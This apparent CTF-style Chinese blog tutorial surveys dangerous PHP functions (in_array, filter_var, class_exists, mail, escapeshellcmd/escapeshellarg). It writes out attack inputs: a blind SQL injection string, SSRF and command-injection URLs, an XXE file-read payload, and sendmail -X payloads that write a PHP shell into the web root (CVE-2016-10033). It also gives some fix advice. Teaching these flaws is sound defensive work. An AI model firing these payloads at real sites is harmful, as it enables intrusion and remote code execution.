@@ -1,0 +1,718 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+ <meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
+<meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
+<meta HTTP-EQUIV="expires" CONTENT="0"> 
+<title>PHP常见危险函数利用 | loecho</title>	
+
+<link rel="stylesheet" href="https://loecho.me/styles/main.css">
+<script type="text/javascript">
+function getCSS()
+{
+        datetoday = new Date();
+        timenow=datetoday.getTime();
+        datetoday.setTime(timenow);
+        thehour = datetoday.getHours();
+
+        if (thehour<0)
+
+            display = "https://loecho.me/media/css/night.css";
+
+       else if (thehour>24)
+
+            display = "https://loecho.me/media/css/night.css";   
+
+        else if (thehour>0)
+           
+            display = "https://loecho.me/media/css/day.css";
+
+        else if (thehour<24)
+
+            display = "https://loecho.me/media/css/day.css";
+      
+
+var css = '<';
+        css+='link rel="stylesheet" href='+display+' \/';
+        css+='>';
+        document.write(css);
+}
+</script>
+<link href="https://fonts.googleapis.com/css?family=Dancing+Script|Liu+Jian+Mao+Cao&display=swap" rel="stylesheet">
+<link href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css" rel="stylesheet" />
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<script type='text/javascript' src='https://loecho.me/media/scripts/script.js'></script>
+<link href="https://cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet" />
+  <script src="https://cdn.bootcss.com/wow/1.1.2/wow.min.js"></script>
+  <script src="https://cdn.bootcss.com/highlight.js/9.15.8/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  <script>wow=new WOW({boxClass:'wow',animateClass:'animated',offset:0,mobile:true,live:true});wow.init();</script>
+
+<script type="text/javascript">
+window.onload=getCSS();
+</script>
+
+
+ 	
+</head>
+<body class="post-template-default single single-post postid-70 single-format-standard">
+    <div id="wrapper">
+        
+			
+		<header id="header" class="site-header" 
+		
+		>
+			<div class="site-branding">
+									<h1 class="site-title"><a href="https://loecho.me" rel="home">loecho</a></h1>
+										
+					<h2 class="site-description"><h4>Red Team@loecho /CTFer@Web /SRC</h4></h2>
+										
+							</div>
+			<nav id="nav-wrapper">
+				<div class="container">
+					<div class="nav-toggle">
+						<div class="bars">
+							<div class="bar"></div>
+							<div class="bar"></div>
+							<div class="bar"></div>
+						</div>
+					</div>
+					<div class="clear"></div>
+					<ul id="" class="dove">
+		 
+
+</ul>
+</li>		
+		
+</ul>				</div>
+			</nav>
+						<div class="jingge">
+
+
+    
+
+    
+			
+<a  href="https://github.com/a1ices" target="_blank" ><i class="iconfont icon-github"></i></a>
+ 
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+			
+<a  href="1414596457" target="_blank" ><i class="iconfont icon-qq"></i></a>
+ 
+    
+
+    
+
+    
+        </header>
+
+		<div id="content" class="container">
+			<div class="row">
+	<div class="col-md-8 site-main">
+				
+<article id="post-70" class="post-70 post type-post status-publish format-standard hentry category-5 tag-10 tag-9 tag-11">
+
+	
+	                      
+		<div class="entry-content">
+			<h1 class="wow swing entry-title">PHP常见危险函数利用</h1>
+<div class="entry-meta">
+<div class="wow bounce">
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-02-29 13:14:46" itemprop="datePublished" pubdate="">2020-02-29</time></i>
+	          </div>
+			
+</span>
+													 
+		</div>
+                  
+			<div class="wow slideInLeft entry-summary song">
+				<h1 id="php常见危险函数和利用">PHP常见危险函数和利用</h1>
+<h2 id="0x01-php">0x01 PHP</h2>
+<p>PHP（全称：PHP：Hypertext Preprocessor，即&quot;PHP：超文本预处理器&quot;）是一种通用开源脚本语言。(弱类型语言)</p>
+<ul>
+<li>PHP     脚本在服务器上执行。</li>
+<li>PHP     可免费下载使用。</li>
+</ul>
+<h2 id="0x02-常见危险函数">0x02 常见危险函数</h2>
+<h3 id="in_array">in_array()</h3>
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.in-array.php"><strong>in_array</strong> </a>：(PHP 4, PHP 5, PHP 7)</p>
+<p><strong>功能</strong> ：检查数组中是否存在某个值</p>
+<p><strong>定义</strong> ： <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code></p>
+<p>在 <strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mi>a</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>a</mi><mi>c</mi><mi>k</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">中</mi><mi mathvariant="normal">搜</mi><mi mathvariant="normal">索</mi><mo>∗</mo><mo>∗</mo></mrow><annotation encoding="application/x-tex">haystack** 中搜索 **</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">搜</span><span class="mord cjk_fallback">索</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span></span></span></span>needle</strong> ，如果第三个参数 <strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>c</mi><mi>t</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">为</mi><mo>∗</mo><mo>∗</mo><mi>T</mi><mi>R</mi><mi>U</mi><mi>E</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">，</mi><mi mathvariant="normal">则</mi><mo>∗</mo><mo>∗</mo><mi>i</mi><msub><mi>n</mi><mi>a</mi></msub><mi>r</mi><mi>r</mi><mi>a</mi><mi>y</mi><mo>(</mo><mo>)</mo><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">行</mi><mi mathvariant="normal">强</mi><mi mathvariant="normal">检</mi><mi mathvariant="normal">查</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">检</mi><mi mathvariant="normal">查</mi><mo>∗</mo><mo>∗</mo></mrow><annotation encoding="application/x-tex">strict** 的值为 **TRUE** ，则 **in_array()** 函数会进行强检查，检查 **</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">为</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∗</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mopen">(</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">强</span><span class="mord cjk_fallback">检</span><span class="mord cjk_fallback">查</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">检</span><span class="mord cjk_fallback">查</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span></span></span></span>needle</strong> 的类型是否和 <strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mi>a</mi><mi>y</mi><mi>s</mi><mi>t</mi><mi>a</mi><mi>c</mi><mi>k</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">中</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">相</mi><mi mathvariant="normal">同</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">找</mi><mi mathvariant="normal">到</mi><mo>∗</mo><mo>∗</mo></mrow><annotation encoding="application/x-tex">haystack** 中的相同。如果找到 **</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">找</span><span class="mord cjk_fallback">到</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span></span></span></span>haystack</strong>，则返回 <strong>TRUE</strong>，否则返回 <strong>FALSE</strong>。</p>
+</blockquote>
+<p><strong>存在漏洞</strong></p>
+<p><strong>1.上传漏洞</strong></p>
+<p>in_array()函数检测上传文件时候，可未将第三个参数设置为true，从而导致攻击者构造文件名绕过服务端的检测。例如上传7shell.php在<code>in_array()</code>函数强制转换后变为7.php</p>
+<p><strong>2.sql注入漏洞</strong></p>
+<p>在传入的参数进行in_array()函数检查的时候，若传入的参数和数组进行比较，且in_array()第三个参数（弱比较）设置为true的话，传入的<code>1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#</code>会和第二个参数（也就是数组）进行弱比较，从而构成sql注入</p>
+<pre><code class="language-sql">INSERT INTO piwigo_rate (user_id,anonymous_id,element_id,rate,date) VALUES (2,'192.168.2',1,1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));#,NOW()) 
+</code></pre>
+<p><strong>修复建议</strong></p>
+<p>可以看到这个漏洞的原因是弱类型比较问题，那么我们就可以使用强匹配进行修复。例如将 <strong>in_array()</strong> 函数的第三个参数设置为 <strong>true</strong> ，或者使用 <strong>intval()</strong> 函数将变量强转成数字，又或者使用正则匹配来处理变量。这里我将 <strong>in_array()</strong> 函数的第三个参数设置为 <strong>true</strong> ，代码及防护效果如下：</p>
+<h3 id="filter_var">filter_var()</h3>
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.filter-var.php"><strong>filter_var</strong> </a>： (PHP 5 &gt;= 5.2.0, PHP 7)</p>
+<p><strong>功能</strong> ：使用特定的过滤器过滤一个变量</p>
+<p><strong>定义</strong> ：<a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <strong>filter_var</strong> ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$variable</code> [, int <code>$filter</code> = FILTER_DEFAULT [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$options</code> ]] )</p>
+<p><code>filter_var()</code> 函数通过指定的过滤器过滤一个变量。</p>
+<p>如果成功，则返回被过滤的数据。如果失败，则返回 FALSE。</p>
+<p>FILTER_VALIDATE_URL 过滤器把值作为 URL 进行验证。</p>
+<p>FILTER_FLAG_SCHEME_REQUIRED — 要求 URL 是 RFC 兼容 URL。（比如：<a href="http://example">http://example）</a>/)</p>
+<p>FILTER_FLAG_HOST_REQUIRED — 要求 URL 包含主机名（<a href="http://www.example.com">http://www.example.com）</a>/)</p>
+<p>FILTER_FLAG_PATH_REQUIRED — 要求 URL 在主机名后存在路径（比如：eg.com/example1/）</p>
+<p>FILTER_FLAG_QUERY_REQUIRED — 要求 URL 存在查询字符串（比如：”eg.php?age=37&quot;）</p>
+</blockquote>
+<p><strong>存在漏洞</strong></p>
+<p><strong>1.xss漏洞</strong></p>
+<p>伪协议绕过<code>filter_var()</code>函数</p>
+<p><strong>2.ssrf漏洞</strong></p>
+<p><code>http://</code> <code>file://</code> <code>test://</code>绕过 <strong>filter_var</strong> 的 <strong>FILTER_VALIDATE_URL</strong> 过滤器</p>
+<pre><code class="language-html">http://localhost/index.php?url=http://demo.com@sec-redclub.com
+http://localhost/index.php?url=http://demo.com&amp;sec-redclub.com
+http://localhost/index.php?url=http://demo.com?sec-redclub.com
+http://localhost/index.php?url=http://demo.com/sec-redclub.com
+http://localhost/index.php?url=demo://demo.com,sec-redclub.com
+http://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/
+http://localhost/index.php?url=http://demo.com#sec-redclub.com
+PS:最后一个payload的#符号，请换成对应的url编码 %23
+</code></pre>
+<p><strong>3.命令执行漏洞</strong></p>
+<pre><code>index.php?url=test1234://”|type;f1agi3hEre.php;sec-redclub.com
+</code></pre>
+<p>参考浅谈<a href="https://www.freebuf.com/articles/web/137923.html">CTF中命令执行与绕过的小技巧</a>对payload进行解释</p>
+<blockquote>
+<p>; 表示 连续指令<br>
+| 表示 管道符左边命令的输出就会作为管道符右边命令的输入<br>
+&amp;符号<br>
+&amp; 放在启动参数后面表示设置此进程为后台进程，默认情况下，进程是前台进程，这时就把Shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望将其在后台启动，可以在启动参数的时候加一个’&amp;’实现这个目的。进程切换到后台的时候，我们把它称为job。切换到后台时会输出相关job信息，这里36210就是该进程的PID</p>
+</blockquote>
+<p>这对XSS漏洞，我们最好就是过滤关键词，将特殊字符进行HTML实体编码替换。</p>
+<h3 id="4filter_var-中-filter_validate_email">4.filter_var() 中 FILTER_VALIDATE_EMAIL</h3>
+<p>关于 <strong>filter_var()</strong> 中 <strong>FILTER_VALIDATE_EMAIL</strong> 这个选项作用，我们可以看看这个帖子 <a href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly">PHP FILTER_VALIDATE_EMAIL</a> 。这里面有个结论引起了我的注意： <strong>none of the special characters in this local part are allowed outside quotation marks</strong> ，表示所有的特殊符号必须放在双引号中。 <strong>filter_var()</strong> 问题在于，我们在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 <strong>filter_val()</strong> 使其认为我们仍然在双引号中，这样我们就可以绕过检测。下面举个简单的例子，方便理解：</p>
+<pre><code class="language-php">&lt;?php
+var_dump(filter_var('is not allowed@example.com',FILTER_VALIDATE_EMAIL));
+var_dump(filter_var('&quot;is.\ not\ allowed&quot;@example.com',FILTER_VALIDATE_EMAIL));
+  ?&gt;
+</code></pre>
+<figure data-type="image" tabindex="1"><a href="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-23_15-21-15.png"><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-23_15-21-15.png" alt="img" loading="lazy"></a></figure>
+<p><strong>修复建议</strong></p>
+<p>我们来看一下 <strong>PHPMailer</strong> 官方给出的修复代码。官方对用户传入的参数进行检测，如果当中存在被转义的字符，则不传递 <strong>-f</strong> 参数（<strong>-f</strong> 参数表示发邮件的人，如果不传递该参数，我们的payload就不会被带入 <strong>mail</strong> 函数，也就不会造成命令执行），所以不建议大家同时使用 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg()</strong> 函数对参数进行过滤，具体修复代码如下：https://xz.aliyun.com/t/2501#toc-5</p>
+<h3 id="class_exists">class_exists()</h3>
+<blockquote>
+<p><a href="http://php.net/manual/zh/function.class-exists.php">class_exists </a>：(PHP 4, PHP 5, PHP 7)</p>
+<p><strong>功能</strong> ：检查类是否已定义</p>
+<p><strong>定义</strong> ： <code>bool class_exists ( string $class_name[, bool $autoload = true ] )</code></p>
+<p><strong><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>a</mi><mi>s</mi><msub><mi>s</mi><mi>n</mi></msub><mi>a</mi><mi>m</mi><mi>e</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">为</mi><mi mathvariant="normal">类</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">匹</mi><mi mathvariant="normal">配</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">候</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">区</mi><mi mathvariant="normal">分</mi><mi mathvariant="normal">大</mi><mi mathvariant="normal">小</mi><mi mathvariant="normal">写</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">默</mi><mi mathvariant="normal">认</mi><mi mathvariant="normal">情</mi><mi mathvariant="normal">况</mi><mi mathvariant="normal">下</mi><mo>∗</mo><mo>∗</mo></mrow><annotation encoding="application/x-tex">class_name** 为类的名字，在匹配的时候不区分大小写。默认情况下 **</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">匹</span><span class="mord cjk_fallback">配</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">候</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">区</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">写</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">默</span><span class="mord cjk_fallback">认</span><span class="mord cjk_fallback">情</span><span class="mord cjk_fallback">况</span><span class="mord cjk_fallback">下</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span></span></span></span>autoload</strong> 为 <strong>true</strong>，当 <strong><span class='katex-error' title='ParseError: KaTeX parse error: Expected group after &#039;_&#039; at position 38: …时，会自动加载本程序中的 **_̲_autoload** 函数；…'>autoload** 为 **true** 时，会自动加载本程序中的 **__autoload** 函数；当 **</span>autoload</strong> 为 <strong>false</strong> 时，则不调用 <strong>__autoload</strong> 函数。</p>
+</blockquote>
+<p><strong>class_exists()</strong> 函数来判断用户传过来的控制器是否存在，默认情况下，如果程序存在 <strong>__autoload</strong> 函数，那么在使用 <strong>class_exists()</strong> 函数就会自动调用本程序中的 <strong>__autoload</strong> 函数，这题的文件包含漏洞就出现在这个地方。攻击者可以使用 <strong>路径穿越</strong> 来包含任意文件，当然使用路径穿越符号的前提是 <strong>PHP5~5.3(包含5.3版本)版本</strong> 之间才可以。例如类名为： <strong>../../../../etc/passwd</strong> 的查找，将查看passwd文件内容，我们来看一下PHP手册对 <strong>class_exists()</strong> 函数的定义：</p>
+<p><strong>存在漏洞</strong></p>
+<p><strong>1.目录穿越</strong></p>
+<p>若是__autoload函数下是<code>include $classname</code></p>
+<p><strong>2.默认情况下加载__autoload()函数</strong></p>
+<p><strong>3.危险的<a href="http://php.net/manual/en/function.spl-autoload-register.php">spl_autoload_register</a> 导致构建函数rce</strong></p>
+<pre><code>http://localhost/CTF/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0
+http://localhost/CTF/index.php?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2
+</code></pre>
+<h3 id="strpos">strpos</h3>
+<blockquote>
+<p><strong>strpos</strong> — 查找字符串首次出现的位置</p>
+<p>作用：主要是用来查找字符在字符串中首次出现的位置。</p>
+<p>结构：<code>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</code></p>
+</blockquote>
+<p><strong>strpos</strong> 函数返回查找到的子字符串的下标。如果字符串开头就是我们要搜索的目标，则返回下标 <strong>0</strong> ；如果搜索不到，则返回 <strong>false</strong> 。!false = true</p>
+<p><strong>存在漏洞</strong></p>
+<p><strong>1.弱类型绕过</strong></p>
+<p><strong>修复建议</strong></p>
+<p>使用 <strong>===</strong> 来代替 <strong>==</strong></p>
+<h3 id="mail函数">mail函数</h3>
+<p><strong>php</strong> 内置函数 <strong>mail</strong> 所引发的命令执行漏洞。我们先看看 <strong>php</strong> 自带的 <strong>mail</strong> 函数的用法：</p>
+<pre><code>bool mail (
+    string $to ,
+    string $subject ,
+    string $message [,
+    string $additional_headers [,
+    string $additional_parameters ]]
+)
+</code></pre>
+<p>其参数含义分别表示如下：</p>
+<blockquote>
+<ul>
+<li>to，指定邮件接收者，即接收人</li>
+<li>subject，邮件的标题</li>
+<li>message，邮件的正文内容</li>
+<li>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li>
+<li>additional_parameters，指定传递给发送程序sendmail的额外参数。</li>
+</ul>
+</blockquote>
+<p>在Linux系统上， <strong>php</strong> 的 <strong>mail</strong> 函数在底层中已经写好了，默认调用 <strong>Linux</strong> 的 <strong>sendmail</strong> 程序发送邮件。而在额外参数( <strong>additional_parameters</strong> )中， <strong>sendmail</strong> 主要支持的选项有以下三种：</p>
+<blockquote>
+<ul>
+<li>
+<p>-O option = value</p>
+<p>QueueDirectory = queuedir 选择队列消息</p>
+</li>
+<li>
+<p>-X logfile</p>
+<p>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</p>
+</li>
+<li>
+<p>-f from email</p>
+<p>这个参数可以让我们指定我们发送邮件的邮箱地址。</p>
+</li>
+</ul>
+</blockquote>
+<p>下面这个样例中，我们使用 <strong>-X</strong> 参数指定日志文件，最终会在 <strong>/var/www/html/rce.php</strong> 中写入如下数据：</p>
+<figure data-type="image" tabindex="2"><a href="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-23_15-18-16.png"><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/Snipaste_2019-08-23_15-18-16.png" alt="img" loading="lazy"></a></figure>
+<h3 id="escapeshellcmd">escapeshellcmd</h3>
+<blockquote>
+<p><strong>escapeshellcmd</strong> ( string <code>$command</code> ) : string</p>
+<p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。</p>
+</blockquote>
+<p>详细分析<code>escapeshellcmd</code>函数处理过程</p>
+<ol>
+<li>
+<p>传入的参数是</p>
+<pre><code class="language-bash">127.0.0.1' -v -d a=1
+</code></pre>
+</li>
+<li>
+<p>由于<code>escapeshellarg</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p>
+<pre><code class="language-bash">'127.0.0.1'\'' -v -d a=1'
+</code></pre>
+</li>
+<li>
+<p>接着 <code>escapeshellcmd</code> 函数对第二步处理后字符串中的 <code>\</code> 以及 <code>a=1'</code> 中的单引号进行转义处理，结果如下所示：</p>
+<pre><code class="language-bash">'127.0.0.1'\\'' -v -d a=1\'
+</code></pre>
+</li>
+<li>
+<p>由于第三步处理之后的payload中的 <code>\\</code> 被解释成了 <code>\</code> 而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分<code>127.0.0.1</code> <code>''</code> -v -d <code>a=1\</code></p>
+</li>
+</ol>
+<p>所以这个payload可以简化为 <code>curl 127.0.0.1\ -v -d a=1'</code> ，即向 <code>127.0.0.1\</code> 发起请求，POST 数据为 <code>a=1'</code> 。</p>
+<p>总结一下，<a href="https://xz.aliyun.com/t/2501">CVE-2016-10033</a>是考察绕过 <strong>filter_var()</strong> 函数的邮件名检测，通过 <strong>mail</strong> 函数底层实现中调用的 <strong>escapeshellcmd()</strong> 函数处理字符串，再结合 <strong>escapeshellarg()</strong> 函数，最终实现参数逃逸，导致 <strong>远程代码执行</strong> 。</p>
+<pre><code>return escapeshellarg($email);
+</code></pre>
+<h3 id="escapeshellarg">escapeshellarg</h3>
+<blockquote>
+<p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数</p>
+<p><strong>功能</strong> ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号)</p>
+</blockquote>
+<p>这里其实有个很奇妙的漏洞，针对用户输入使用 <strong>escapeshellarg</strong> 函数进行处理。所以，在最新版本中使用之前的 payload 进行攻击会失败，例如：</p>
+<pre><code>a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com
+</code></pre>
+<p>但是，却可以使用下面这个 <strong>payload</strong> 进行攻击：</p>
+<pre><code>a'( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com
+</code></pre>
+<p>际上，可用于攻击的代码只是在之前的基础上多了一个单引号。之所以这次的攻击代码能够成功，是因为修复代码多了 <strong>escapeshellcmd</strong> 函数，结合上 <strong>mail()</strong> 函数底层调用的 <strong>escapeshellarg</strong> 函数，最终导致单引号逃逸。</p>
+<p>我们的 <strong>payload</strong> 最终在执行时变成了</p>
